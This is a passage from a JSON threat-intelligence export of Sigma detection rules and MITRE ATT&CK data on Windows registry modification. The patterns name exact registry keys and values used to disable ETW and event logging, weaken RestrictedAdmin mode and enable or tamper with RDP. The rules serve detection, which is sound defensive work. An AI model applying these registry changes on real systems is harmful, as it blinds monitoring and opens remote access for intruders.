                            "raw": "author: Oddvar Moe, Sander Wiebing, oscd.community\ndate: 2020/10/07\ndescription: Detects the import of the specified file to the registry with regedit.exe.\ndetection:\n  condition: selection and not all of filter*\n  filter:\n    CommandLine|contains:\n    - ' /e '\n    - ' /a '\n    - ' /c '\n    - ' -e '\n    - ' -a '\n    - ' -c '\n  filter_2:\n    CommandLine|re: :[^ \\\\]\n  selection:\n    CommandLine|contains:\n    - ' /i '\n    - ' /s '\n    - .reg\n    Image|endswith: \\regedit.exe\nfalsepositives:\n- Legitimate import of keys\n- Evernote\nfields:\n- ParentImage\n- CommandLine\nid: 73bba97f-a82d-42ce-b315-9182e76c57b1\nlevel: medium\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2022/12/31\nreferences:\n- https://lolbas-project.github.io/lolbas/Binaries/Regedit/\n- https://gist.github.com/api0cradle/cdd2d0d0ec9abb686f0e89306e277b8f\nrelated:\n- id: 0b80ade5-6997-4b1d-99a1-71701778ea61\n  type: similar\nstatus: test\ntags:\n- attack.t1112\n- attack.defense_evasion\ntitle: Imports Registry Key From a File\n",
                            "sigma:id": "73bba97f-a82d-42ce-b315-9182e76c57b1",
                            "title": "Imports Registry Key From a File",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "a4c90ea1-2634-4ca0-adbb-35eae169b6fc",
                        "lookup_data": {
                            "description": "Potential adversaries stopping ETW providers recording loaded .NET assemblies.",
                            "raw": "author: Roberto Rodriguez (Cyb3rWard0g), OTR (Open Threat Research)\ndate: 2020/06/05\ndescription: Potential adversaries stopping ETW providers recording loaded .NET assemblies.\ndetection:\n  condition: 1 of selection_*\n  selection_complus:\n    EventID: 4657\n    NewValue: 0\n    ObjectName|contains: \\Environment\n    ObjectValueName:\n    - COMPlus_ETWEnabled\n    - COMPlus_ETWFlags\n  selection_etw_enabled:\n    EventID: 4657\n    NewValue: 0\n    ObjectName|endswith: \\SOFTWARE\\Microsoft\\.NETFramework\n    ObjectValueName: ETWEnabled\nfalsepositives:\n- Unknown\nid: a4c90ea1-2634-4ca0-adbb-35eae169b6fc\nlevel: high\nlogsource:\n  product: windows\n  service: security\nmodified: 2022/12/20\nreferences:\n- https://twitter.com/_xpn_/status/1268712093928378368\n- https://social.msdn.microsoft.com/Forums/vstudio/en-US/0878832e-39d7-4eaf-8e16-a729c4c40975/what-can-i-use-e13c0d23ccbc4e12931bd9cc2eee27e4-for?forum=clr\n- https://github.com/dotnet/runtime/blob/ee2355c801d892f2894b0f7b14a20e6cc50e0e54/docs/design/coreclr/jit/viewing-jit-dumps.md#setting-configuration-variables\n- https://github.com/dotnet/runtime/blob/f62e93416a1799aecc6b0947adad55a0d9870732/src/coreclr/src/inc/clrconfigvalues.h#L35-L38\n- https://github.com/dotnet/runtime/blob/7abe42dc1123722ed385218268bb9fe04556e3d3/src/coreclr/src/inc/clrconfig.h#L33-L39\n- https://github.com/dotnet/runtime/search?p=1&q=COMPlus_&unscoped_q=COMPlus_\n- https://bunnyinside.com/?term=f71e8cb9c76a\n- http://managed670.rssing.com/chan-5590147/all_p1.html\n- https://github.com/dotnet/runtime/blob/4f9ae42d861fcb4be2fcd5d3d55d5f227d30e723/docs/coding-guidelines/clr-jit-coding-conventions.md#1412-disabling-code\n- https://i.blackhat.com/EU-21/Wednesday/EU-21-Teodorescu-Veni-No-Vidi-No-Vici-Attacks-On-ETW-Blind-EDRs.pdf\nrelated:\n- id: bf4fc428-dcc3-4bbd-99fe-2422aeee2544\n  type: similar\nstatus: test\ntags:\n- attack.defense_evasion\n- attack.t1112\n- attack.t1562\ntitle: ETW Logging Disabled In .NET Processes - Registry\n",
                            "sigma:id": "a4c90ea1-2634-4ca0-adbb-35eae169b6fc",
                            "title": "ETW Logging Disabled In .NET Processes - Registry",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "d6ce7ebd-260b-4323-9768-a9631c8d4db2",
                        "lookup_data": {
                            "description": "Detect activation of DisableRestrictedAdmin to desable RestrictedAdmin mode.\nRestrictedAdmin mode prevents the transmission of reusable credentials to the remote system to which you connect using Remote Desktop.\nThis prevents your credentials from being harvested during the initial connection process if the remote server has been compromise\n",
                            "raw": "author: frack113\ndate: 2023/01/13\ndescription: 'Detect activation of DisableRestrictedAdmin to desable RestrictedAdmin\n  mode.\n\n  RestrictedAdmin mode prevents the transmission of reusable credentials to the remote\n  system to which you connect using Remote Desktop.\n\n  This prevents your credentials from being harvested during the initial connection\n  process if the remote server has been compromise\n\n  '\ndetection:\n  condition: selection\n  selection:\n    Details: DWORD (0x00000001)\n    EventType: SetValue\n    TargetObject|endswith: System\\CurrentControlSet\\Control\\Lsa\\DisableRestrictedAdmin\nfalsepositives:\n- Unknown\nid: d6ce7ebd-260b-4323-9768-a9631c8d4db2\nlevel: high\nlogsource:\n  category: registry_set\n  product: windows\nreferences:\n- https://github.com/redcanaryco/atomic-red-team/blob/a8e3cf63e97b973a25903d3df9fd55da6252e564/atomics/T1112/T1112.md\n- https://social.technet.microsoft.com/wiki/contents/articles/32905.remote-desktop-services-enable-restricted-admin-mode.aspx\nrelated:\n- id: 28ac00d6-22d9-4a3c-927f-bbd770104573\n  type: similar\nstatus: experimental\ntags:\n- attack.defense_evasion\n- attack.t1112\ntitle: Disabled RestrictedAdminMode For RDS\n",
                            "sigma:id": "d6ce7ebd-260b-4323-9768-a9631c8d4db2",
                            "title": "Disabled RestrictedAdminMode For RDS",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "a2863fbc-d5cb-48d5-83fb-d976d4b1743b",
                        "lookup_data": {
                            "description": "Detects tampering of RDP Terminal Service/Server sensitive settings.\nSuch as allowing unauthorized users access to a system via the 'fAllowUnsolicited' or enabling RDP via 'fDenyTSConnections', etc.\n",
                            "raw": "author: Samir Bousseaden, David ANDRE, Roberto Rodriguez @Cyb3rWard0g, Nasreddine\n  Bencherchali\ndate: 2022/09/29\ndescription: 'Detects tampering of RDP Terminal Service/Server sensitive settings.\n\n  Such as allowing unauthorized users access to a system via the ''fAllowUnsolicited''\n  or enabling RDP via ''fDenyTSConnections'', etc.\n\n  '\ndetection:\n  condition: selection\n  selection:\n    Details: DWORD (0x00000000)\n    TargetObject|endswith:\n    - \\fDenyTSConnections\n    - \\fSingleSessionPerUser\n    - \\UserAuthentication\nfalsepositives:\n- Some of the keys mentioned here could be modified by an administrator while setting\n  group policy (it should be investigated either way)\nid: a2863fbc-d5cb-48d5-83fb-d976d4b1743b\nlevel: medium\nlogsource:\n  category: registry_set\n  product: windows\nmodified: 2022/11/26\nreferences:\n- https://blog.menasec.net/2019/02/threat-hunting-rdp-hijacking-via.html\n- http://woshub.com/rds-shadow-how-to-connect-to-a-user-session-in-windows-server-2012-r2/\n- https://twitter.com/SagieSec/status/1469001618863624194?t=HRf0eA0W1YYzkTSHb-Ky1A&s=03\n- https://threathunterplaybook.com/notebooks/windows/05_defense_evasion/WIN-190407183310.html\n- https://bazaar.abuse.ch/sample/6f3aa9362d72e806490a8abce245331030d1ab5ac77e400dd475748236a6cc81/\n- http://etutorials.org/Microsoft+Products/microsoft+windows+server+2003+terminal+services/Chapter+6+Registry/Registry+Keys+for+Terminal+Services/\n- https://admx.help/HKLM/SOFTWARE/Policies/Microsoft/Windows%20NT/Terminal%20Services\nrelated:\n- id: 3f6b7b62-61aa-45db-96bd-9c31b36b653c\n  type: similar\nstatus: test\ntags:\n- attack.defense_evasion\n- attack.persistence\n- attack.t1112\ntitle: RDP Sensitive Settings Changed to Zero\n",
                            "sigma:id": "a2863fbc-d5cb-48d5-83fb-d976d4b1743b",
                            "title": "RDP Sensitive Settings Changed to Zero",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "171b67e1-74b4-460e-8d55-b331f3e32d67",
                        "lookup_data": {
                            "description": "Detects changes to RDP terminal service sensitive settings",
                            "raw": "author: Samir Bousseaden\ndate: 2019/04/03\ndescription: Detects changes to RDP terminal service sensitive settings\ndetection:\n  condition: selection_reg\n  selection_reg:\n    TargetObject|contains:\n    - \\services\\TermService\\Parameters\\ServiceDll\n    - \\Control\\Terminal Server\\fSingleSessionPerUser\n    - \\Control\\Terminal Server\\fDenyTSConnections\nfalsepositives:\n- unknown\nid: 171b67e1-74b4-460e-8d55-b331f3e32d67\nlevel: high\nlogsource:\n  category: registry_event\n  product: windows\nmodified: 2020/09/06\nreferences:\n- https://blog.menasec.net/2019/02/threat-hunting-rdp-hijacking-via.html\ntags:\n- attack.defense_evasion\n- attack.t1112\ntitle: RDP Sensitive Settings Changed\n",
                            "sigma:id": "171b67e1-74b4-460e-8d55-b331f3e32d67",
                            "title": "RDP Sensitive Settings Changed",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "5f60740a-f57b-4e76-82a1-15b6ff2cb134",
                        "lookup_data": {
                            "description": "Detects the execution of regini.exe which can be used to modify registry keys, the changes are imported from one or more text files.",
                            "raw": "author: Eli Salem, Sander Wiebing, oscd.community\ndate: 2020/10/08\ndescription: Detects the execution of regini.exe which can be used to modify registry\n  keys, the changes are imported from one or more text files.\ndetection:\n  condition: selection and not filter\n  filter:\n    CommandLine|re: :[^ \\\\]\n  selection:\n  - Image|endswith: \\regini.exe\n  - OriginalFileName: REGINI.EXE\nfalsepositives:\n- Legitimate modification of keys\nfields:\n- ParentImage\n- CommandLine\nid: 5f60740a-f57b-4e76-82a1-15b6ff2cb134\nlevel: low\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2022/12/31\nreferences:\n- https://lolbas-project.github.io/lolbas/Binaries/Regini/\n- https://gist.github.com/api0cradle/cdd2d0d0ec9abb686f0e89306e277b8f\n- https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/regini\nrelated:\n- id: 77946e79-97f1-45a2-84b4-f37b5c0d8682\n  type: derived\nstatus: experimental\ntags:\n- attack.t1112\n- attack.defense_evasion\ntitle: Modifies the Registry From a File\n",
                            "sigma:id": "5f60740a-f57b-4e76-82a1-15b6ff2cb134",
                            "title": "Modifies the Registry From a File",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "5c6baef6-fca0-446e-b0b1-ac45950d210f",
                        "lookup_data": {
                            "description": "Financial - socgen-compliance.com fake website delivering malicious documents",
                            "link": "https://www.circl.lu/doc/misp/feed-osint/5c6baef6-fca0-446e-b0b1-ac45950d210f.json",
                            "misp:feed": "https://www.circl.lu/doc/misp/feed-osint",
                            "timestamp": "1550562629",
                            "uuid": "5c6baef6-fca0-446e-b0b1-ac45950d210f",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "35c55673-84ca-4e99-8d09-e334f3c29539",
                        "lookup_data": {
                            "description": "Detects remote RPC calls to modify the registry and possible execute code",
                            "raw": "author: Sagie Dulce, Dekel Paz\ndate: 2022/01/01\ndescription: Detects remote RPC calls to modify the registry and possible execute\n  code\ndetection:\n  condition: selection\n  selection:\n    EventID: 3\n    EventLog: RPCFW\n    InterfaceUuid: 338cd001-2244-31f1-aaaa-900038001003\n    OpNum:\n    - 6\n    - 7\n    - 8\n    - 13\n    - 18\n    - 19\n    - 21\n    - 22\n    - 23\n    - 35\nfalsepositives:\n- Remote administration of registry values\nid: 35c55673-84ca-4e99-8d09-e334f3c29539\nlevel: high\nlogsource:\n  category: application\n  definition: 'Requirements: install and apply the RPC Firewall to all processes with\n    \"audit:true action:block uuid:338cd001-2244-31f1-aaaa-900038001003\"'\n  product: rpc_firewall\nmodified: 2022/01/01\nreferences:\n- https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-rrp/0fa3191d-bb79-490a-81bd-54c2601b7a78\n- https://github.com/jsecurity101/MSRPC-to-ATTACK/blob/ddd4608fe8684fcf2fcf9b48c5f0b3c28097f8a3/documents/MS-RRP.md\n- https://github.com/zeronetworks/rpcfirewall\n- https://zeronetworks.com/blog/stopping_lateral_movement_via_the_rpc_firewall/\nstatus: test\ntags:\n- attack.lateral_movement\n- attack.t1112\ntitle: Remote Registry Lateral Movement\n",
                            "sigma:id": "35c55673-84ca-4e99-8d09-e334f3c29539",
                            "title": "Remote Registry Lateral Movement",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "0d5675be-bc88-4172-86d3-1e96a4476536",
                        "lookup_data": {
                            "description": "Detects the execution of reg.exe and subsequent command line arguments for enabling RDP service on the host by tampering with the 'CurrentControlSet\\Control\\Terminal Server' subkeys",
                            "raw": "author: '@Kostastsale, @TheDFIRReport, slightly modified by pH-T (Nextron Systems)'\ndate: 2022/02/12\ndescription: Detects the execution of reg.exe and subsequent command line arguments\n  for enabling RDP service on the host by tampering with the 'CurrentControlSet\\Control\\Terminal\n  Server' subkeys\ndetection:\n  condition: selection_cli and 1 of selection_values_*\n  selection_cli:\n    CommandLine|contains|all:\n    - ' add '\n    - \\CurrentControlSet\\Control\\Terminal Server\n    - REG_DWORD\n    - ' /f'\n    Image|endswith: \\reg.exe\n  selection_values_1:\n    CommandLine|contains|all:\n    - Licensing Core\n    - EnableConcurrentSessions\n  selection_values_2:\n    CommandLine|contains:\n    - WinStations\\RDP-Tcp\n    - MaxInstanceCount\n    - fEnableWinStation\n    - TSUserEnabled\n    - TSEnabled\n    - TSAppCompat\n    - IdleWinStationPoolCount\n    - TSAdvertise\n    - AllowTSConnections\n    - fSingleSessionPerUser\n    - fDenyTSConnections\nfalsepositives:\n- Unknown\nid: 0d5675be-bc88-4172-86d3-1e96a4476536\nlevel: high\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2022/09/09\nreferences:\n- https://thedfirreport.com/2022/02/21/qbot-and-zerologon-lead-to-full-domain-compromise/\nstatus: experimental\ntags:\n- attack.defense_evasion\n- attack.lateral_movement\n- attack.t1021.001\n- attack.t1112\ntitle: Enabling RDP Service via Reg.exe\n",
                            "sigma:id": "0d5675be-bc88-4172-86d3-1e96a4476536",
                            "title": "Enabling RDP Service via Reg.exe",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "77946e79-97f1-45a2-84b4-f37b5c0d8682",
                        "lookup_data": {
                            "description": "Detects the import of an alternate data stream with regini.exe, regini.exe can be used to modify registry keys.",
                            "raw": "author: Eli Salem, Sander Wiebing, oscd.community\ndate: 2020/10/12\ndescription: Detects the import of an alternate data stream with regini.exe, regini.exe\n  can be used to modify registry keys.\ndetection:\n  condition: selection and selection_re\n  selection:\n  - Image|endswith: \\regini.exe\n  - OriginalFileName: REGINI.EXE\n  selection_re:\n    CommandLine|re: :[^ \\\\]\nfalsepositives:\n- Unknown\nfields:\n- ParentImage\n- CommandLine\nid: 77946e79-97f1-45a2-84b4-f37b5c0d8682\nlevel: high\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2022/12/31\nreferences:\n- https://lolbas-project.github.io/lolbas/Binaries/Regini/\n- https://gist.github.com/api0cradle/cdd2d0d0ec9abb686f0e89306e277b8f\n- https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/regini\nrelated:\n- id: 5f60740a-f57b-4e76-82a1-15b6ff2cb134\n  type: derived\nstatus: experimental\ntags:\n- attack.t1112\n- attack.defense_evasion\ntitle: Modifies the Registry From a ADS\n",
                            "sigma:id": "77946e79-97f1-45a2-84b4-f37b5c0d8682",
                            "title": "Modifies the Registry From a ADS",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "4f281b83-0200-4b34-bf35-d24687ea57c2",
                        "lookup_data": {
                            "description": "Detects changes to the \"TracingDisabled\" key in order to disable ETW logging for services.exe (SCM)",
                            "raw": "author: Nasreddine Bencherchali (Nextron Systems)\ndate: 2022/12/09\ndescription: Detects changes to the \"TracingDisabled\" key in order to disable ETW\n  logging for services.exe (SCM)\ndetection:\n  condition: selection\n  selection:\n    Details: DWORD (0x00000001)\n    EventType: SetValue\n    TargetObject|endswith: Software\\Microsoft\\Windows NT\\CurrentVersion\\Tracing\\SCM\\Regular\\TracingDisabled\nfalsepositives:\n- Unknown\nid: 4f281b83-0200-4b34-bf35-d24687ea57c2\nlevel: low\nlogsource:\n  category: registry_set\n  product: windows\nreferences:\n- http://redplait.blogspot.com/2020/07/whats-wrong-with-etw.html\nstatus: experimental\ntags:\n- attack.defense_evasion\n- attack.t1112\n- attack.t1562\ntitle: ETW Logging Disabled For SCM\n",
                            "sigma:id": "4f281b83-0200-4b34-bf35-d24687ea57c2",
                            "title": "ETW Logging Disabled For SCM",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "3f6b7b62-61aa-45db-96bd-9c31b36b653c",
                        "lookup_data": {
                            "description": "Detects tampering of RDP Terminal Service/Server sensitive settings.\nSuch as allowing unauthorized users access to a system via the 'fAllowUnsolicited' or enabling RDP via 'fDenyTSConnections'...etc\n",
                            "raw": "author: Samir Bousseaden, David ANDRE, Roberto Rodriguez @Cyb3rWard0g, Nasreddine\n  Bencherchali\ndate: 2022/08/06\ndescription: 'Detects tampering of RDP Terminal Service/Server sensitive settings.\n\n  Such as allowing unauthorized users access to a system via the ''fAllowUnsolicited''\n  or enabling RDP via ''fDenyTSConnections''...etc\n\n  '\ndetection:\n  condition: selection_shadow or (selection_terminal_services_key and selection_terminal_services_values)\n    or selection_tamper_only\n  selection_shadow:\n    Details:\n    - DWORD (0x00000001)\n    - DWORD (0x00000002)\n    - DWORD (0x00000003)\n    - DWORD (0x00000004)\n    EventType: SetValue\n    TargetObject|contains:\n    - SOFTWARE\\Policies\\Microsoft\\Windows NT\\Terminal Services\\\n    - \\Control\\Terminal Server\\\n    TargetObject|endswith: \\Shadow\n  selection_tamper_only:\n    EventType: SetValue\n    TargetObject|contains:\n    - \\services\\TermService\\Parameters\\ServiceDll\n    - \\Control\\Terminal Server\\WinStations\\RDP-Tcp\\InitialProgram\n    - \\Control\\Terminal Server\\InitialProgram\n    - SOFTWARE\\Policies\\Microsoft\\Windows NT\\Terminal Services\\InitialProgram\n  selection_terminal_services_key:\n    EventType: SetValue\n    TargetObject|contains:\n    - \\Control\\Terminal Server\\\n    - SOFTWARE\\Policies\\Microsoft\\Windows NT\\Terminal Services\\\n  selection_terminal_services_values:\n    Details: DWORD (0x00000001)\n    TargetObject|endswith:\n    - \\fAllowUnsolicited\n    - \\fAllowUnsolicitedFullControl\nfalsepositives:\n- Some of the keys mentioned here could be modified by an administrator while setting\n  group policy (it should be investigated either way)\nid: 3f6b7b62-61aa-45db-96bd-9c31b36b653c\nlevel: high\nlogsource:\n  category: registry_set\n  product: windows\nmodified: 2022/09/29\nreferences:\n- https://blog.menasec.net/2019/02/threat-hunting-rdp-hijacking-via.html\n- http://woshub.com/rds-shadow-how-to-connect-to-a-user-session-in-windows-server-2012-r2/\n- https://twitter.com/SagieSec/status/1469001618863624194?t=HRf0eA0W1YYzkTSHb-Ky1A&s=03\n- https://threathunterplaybook.com/notebooks/windows/05_defense_evasion/WIN-190407183310.html\n- https://bazaar.abuse.ch/sample/6f3aa9362d72e806490a8abce245331030d1ab5ac77e400dd475748236a6cc81/\n- http://etutorials.org/Microsoft+Products/microsoft+windows+server+2003+terminal+services/Chapter+6+Registry/Registry+Keys+for+Terminal+Services/\n- https://admx.help/HKLM/SOFTWARE/Policies/Microsoft/Windows%20NT/Terminal%20Services\nrelated:\n- id: 171b67e1-74b4-460e-8d55-b331f3e32d67\n  type: obsoletes\n- id: 41904ebe-d56c-4904-b9ad-7a77bdf154b3\n  type: obsoletes\n- id: a2863fbc-d5cb-48d5-83fb-d976d4b1743b\n  type: similar\nstatus: test\ntags:\n- attack.defense_evasion\n- attack.persistence\n- attack.t1112\ntitle: RDP Sensitive Settings Changed\n",
                            "sigma:id": "3f6b7b62-61aa-45db-96bd-9c31b36b653c",
                            "title": "RDP Sensitive Settings Changed",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "53ba33fd-3a50-4468-a5ef-c583635cfa92",
                        "lookup_data": {
                            "description": "Detects Chafer activity attributed to OilRig as reported in Nyotron report in March 2018",
                            "raw": "author: Florian Roth (Nextron Systems), Markus Neis, Jonhnathan Ribeiro, Daniil Yugoslavskiy,\n  oscd.community\ndate: 2018/03/23\ndescription: Detects Chafer activity attributed to OilRig as reported in Nyotron report\n  in March 2018\ndetection:\n  condition: selection_service\n  selection_service:\n    EventID: 7045\n    Provider_Name: Service Control Manager\n    ServiceName:\n    - SC Scheduled Scan\n    - UpdatMachine\nfalsepositives:\n- Unknown\nid: 53ba33fd-3a50-4468-a5ef-c583635cfa92\nlevel: critical\nlogsource:\n  product: windows\n  service: system\nmodified: 2022/11/27\nreferences:\n- https://nyotron.com/nyotron-discovers-next-generation-oilrig-attacks/\nstatus: experimental\ntags:\n- attack.persistence\n- attack.g0049\n- attack.t1053.005\n- attack.s0111\n- attack.t1543.003\n- attack.defense_evasion\n- attack.t1112\n- attack.command_and_control\n- attack.t1071.004\ntitle: Chafer Activity - System\n",
                            "sigma:id": "53ba33fd-3a50-4468-a5ef-c583635cfa92",
                            "title": "Chafer Activity - System",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "57340c81-c025-4189-8fa0-fc7ede51bae4",
                        "lookup_data": {
                            "capec": "CAPEC-203",
                            "mitre-attack-id": "T1112",
                            "mitre-cti:description": "Adversaries may interact with the Windows Registry to hide configuration information within Registry keys, remove information as part of cleaning up, or as part of other techniques to aid in persistence and execution.\n\nAccess to specific areas of the Registry depends on account permissions, some requiring administrator-level access. The built-in Windows command-line utility [Reg](https://attack.mitre.org/software/S0075) may be used for local or remote Registry modification. (Citation: Microsoft Reg) Other tools may also be used, such as a remote access tool, which may contain functionality to interact with the Registry through the Windows API.\n\nRegistry modifications may also include actions to hide keys, such as prepending key names with a null character, which will cause an error and/or be ignored when read via [Reg](https://attack.mitre.org/software/S0075) or other utilities using the Win32 API. (Citation: Microsoft Reghide NOV 2006) Adversaries may abuse these pseudo-hidden keys to conceal payloads/commands used to maintain persistence. (Citation: TrendMicro POWELIKS AUG 2014) (Citation: SpectorOps Hiding Reg Jul 2017)\n\nThe Registry of a remote system may be modified to aid in execution of files as part of lateral movement. It requires the remote Registry service to be running on the target system. (Citation: Microsoft Remote) Often [Valid Accounts](https://attack.mitre.org/techniques/T1078) are required, along with access to the remote system's [SMB/Windows Admin Shares](https://attack.mitre.org/techniques/T1021/002) for RPC communication.",
                            "mitre-cti:name": "Modify Registry",
                            "mitre-cti:type": "attack-pattern",
                            "raw": "{'x_mitre_platforms': ['Windows'], 'x_mitre_domains': ['enterprise-attack'], 'x_mitre_contributors': ['Bartosz Jerzman', 'Travis Smith, Tripwire', 'David Lu, Tripwire'], 'object_marking_refs': ['marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168'], 'id': 'attack-pattern--57340c81-c025-4189-8fa0-fc7ede51bae4', 'type': 'attack-pattern', 'created': '2017-05-31T21:31:23.587Z', 'created_by_ref': 'identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5', 'external_references': [{'source_name': 'mitre-attack', 'external_id': 'T1112', 'url': 'https://attack.mitre.org/techniques/T1112'}, {'external_id': 'CAPEC-203', 'source_name': 'capec', 'url': 'https://capec.mitre.org/data/definitions/203.html'}, {'url': 'https://technet.microsoft.com/en-us/library/cc732643.aspx', 'description': 'Microsoft. (2012, April 17). Reg. Retrieved May 1, 2015.', 'source_name': 'Microsoft Reg'}, {'url': 'https://docs.microsoft.com/sysinternals/downloads/reghide', 'description': 'Russinovich, M. & Sharkey, K. (2006, January 10). Reghide. Retrieved August 9, 2018.', 'source_name': 'Microsoft Reghide NOV 2006'}, {'url': 'https://blog.trendmicro.com/trendlabs-security-intelligence/poweliks-malware-hides-in-windows-registry/', 'description': 'Santos, R. (2014, August 1). POWELIKS: Malware Hides In Windows Registry. Retrieved August 9, 2018.', 'source_name': 'TrendMicro POWELIKS AUG 2014'}, {'url': 'https://posts.specterops.io/hiding-registry-keys-with-psreflect-b18ec5ac8353', 'description': 'Reitz, B. (2017, July 14). Hiding Registry keys with PSReflect. Retrieved August 9, 2018.', 'source_name': 'SpectorOps Hiding Reg Jul 2017'}, {'url': 'https://technet.microsoft.com/en-us/library/cc754820.aspx', 'description': 'Microsoft. (n.d.). Enable the Remote Registry Service. Retrieved May 1, 2015.', 'source_name': 'Microsoft Remote'}, {'url': 'https://docs.microsoft.com/windows/security/threat-protection/auditing/event-4657', 'description': 'Miroshnikov, A. & Hall, J. (2017, April 18). 4657(S): A registry value was modified. Retrieved August 9, 2018.', 'source_name': 'Microsoft 4657 APR 2017'}, {'url': 'https://docs.microsoft.com/en-us/sysinternals/downloads/regdelnull', 'description': 'Russinovich, M. & Sharkey, K. (2016, July 4). RegDelNull v1.11. Retrieved August 10, 2018.', 'source_name': 'Microsoft RegDelNull July 2016'}], 'modified': '2020-08-13T20:02:49.641Z', 'name': 'Modify Registry', 'description': \"Adversaries may interact with the Windows Registry to hide configuration information within Registry keys, remove information as part of cleaning up, or as part of other techniques to aid in persistence and execution.\\n\\nAccess to specific areas of the Registry depends on account permissions, some requiring administrator-level access. The built-in Windows command-line utility [Reg](https://attack.mitre.org/software/S0075) may be used for local or remote Registry modification. (Citation: Microsoft Reg) Other tools may also be used, such as a remote access tool, which may contain functionality to interact with the Registry through the Windows API.\\n\\nRegistry modifications may also include actions to hide keys, such as prepending key names with a null character, which will cause an error and/or be ignored when read via [Reg](https://attack.mitre.org/software/S0075) or other utilities using the Win32 API. (Citation: Microsoft Reghide NOV 2006) Adversaries may abuse these pseudo-hidden keys to conceal payloads/commands used to maintain persistence. (Citation: TrendMicro POWELIKS AUG 2014) (Citation: SpectorOps Hiding Reg Jul 2017)\\n\\nThe Registry of a remote system may be modified to aid in execution of files as part of lateral movement. It requires the remote Registry service to be running on the target system. (Citation: Microsoft Remote) Often [Valid Accounts](https://attack.mitre.org/techniques/T1078) are required, along with access to the remote system's [SMB/Windows Admin Shares](https://attack.mitre.org/techniques/T1021/002) for RPC communication.\", 'kill_chain_phases': [{'kill_chain_name': 'mitre-attack', 'phase_name': 'defense-evasion'}], 'x_mitre_detection': 'Modifications to the Registry are normal and occur throughout typical use of the Windows operating system. Consider enabling Registry Auditing on specific keys to produce an alertable event (Event ID 4657) whenever a value is changed (though this may not trigger when values are created with Reghide or other evasive methods). (Citation: Microsoft 4657 APR 2017) Changes to Registry entries that load software on Windows startup that do not correlate with known software, patch cycles, etc., are suspicious, as are additions or changes to files within the startup folder. Changes could also include new services and modification of existing binary paths to point to malicious files. If a change to a service-related entry occurs, then it will likely be followed by a local or remote service start or restart to execute the file.\\n\\nMonitor processes and command-line arguments for actions that could be taken to change or delete information in the Registry. Remote access tools with built-in features may interact directly with the Windows API to gather information. The Registry may also be modified through Windows system management tools such as [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) and [PowerShell](https://attack.mitre.org/techniques/T1059/001), which may require additional logging features to be configured in the operating system to collect necessary information for analysis.\\n\\nMonitor for processes, command-line arguments, and API calls associated with concealing Registry keys, such as Reghide. (Citation: Microsoft Reghide NOV 2006) Inspect and cleanup malicious hidden Registry entries using Native Windows API calls and/or tools such as Autoruns (Citation: SpectorOps Hiding Reg Jul 2017) and RegDelNull (Citation: Microsoft RegDelNull July 2016).', 'x_mitre_version': '1.2', 'x_mitre_modified_by_ref': 'identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5', 'x_mitre_data_sources': ['Process: Process Creation', 'Windows Registry: Windows Registry Key Creation', 'Command: Command Execution', 'Windows Registry: Windows Registry Key Modification', 'Process: OS API Execution', 'Windows Registry: Windows Registry Key Deletion'], 'x_mitre_defense_bypassed': ['Host forensic analysis'], 'x_mitre_permissions_required': ['User', 'Administrator', 'SYSTEM'], 'x_mitre_is_subtechnique': False}",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "919f2ef0-be2d-4a7a-b635-eb2b41fde044",
                        "lookup_data": {
                            "description": "Detects the addition of a key 'MiniNt' to the registry. Upon a reboot, Windows Event Log service will stopped write events.",
                            "raw": "author: Ilyas Ochkov, oscd.community\ndate: 2019/10/25\ndescription: Detects the addition of a key 'MiniNt' to the registry. Upon a reboot,\n  Windows Event Log service will stopped write events.\ndetection:\n  condition: selection\n  selection:\n  - EventType: CreateKey\n    TargetObject: HKLM\\SYSTEM\\CurrentControlSet\\Control\\MiniNt\n  - NewName: HKLM\\SYSTEM\\CurrentControlSet\\Control\\MiniNt\nfalsepositives:\n- Unknown\nfields:\n- EventID\n- Image\n- TargetObject\n- NewName\nid: 919f2ef0-be2d-4a7a-b635-eb2b41fde044\nlevel: high\nlogsource:\n  category: registry_event\n  product: windows\nmodified: 2021/11/27\nreferences:\n- https://twitter.com/0gtweet/status/1182516740955226112\nstatus: test\ntags:\n- attack.defense_evasion\n- attack.t1562.001\n- attack.t1112\ntitle: Disable Security Events Logging Adding Reg Key MiniNt\n",
                            "sigma:id": "919f2ef0-be2d-4a7a-b635-eb2b41fde044",
                            "title": "Disable Security Events Logging Adding Reg Key MiniNt",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "d3abac66-f11c-4ed0-8acb-50cc29c97eed",
                        "lookup_data": {
                            "description": "Detects NetNTLM downgrade attack",
